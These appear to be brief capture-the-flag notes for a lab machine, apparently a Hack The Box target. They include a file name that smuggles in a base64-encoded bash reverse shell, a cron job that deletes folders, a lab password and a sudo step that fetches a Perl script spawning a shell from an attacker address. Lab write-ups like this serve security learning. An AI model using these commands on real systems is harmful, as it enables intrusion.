file name:
`echo 'YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTYuMTgvOTAwNSA8JjEnCg==' | base64 -d | bash`

```
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log 
&& rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
```
SMTP:STEVE.MORTON@EFORENZICS.HTB
Hi Steve,

Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I'm concerned that they are moving data on to production without following our data transfer procedures.

Regards.

Tom
Thomas Jones <thomas.jones@eforenzics.htb>
![[Pasted image 20230122000745.png]]
`Def@ultf0r3nz!csPa$$`
![[Pasted image 20230122000757.png]]

![[Pasted image 20230122004520.png]]

![[Pasted image 20230122012314.png]]

`echo "exec "/bin/sh"; > test.pl"`
`sudo /usr/bin/binary http://10.10.16.21/test.pl lDnxUysaQn`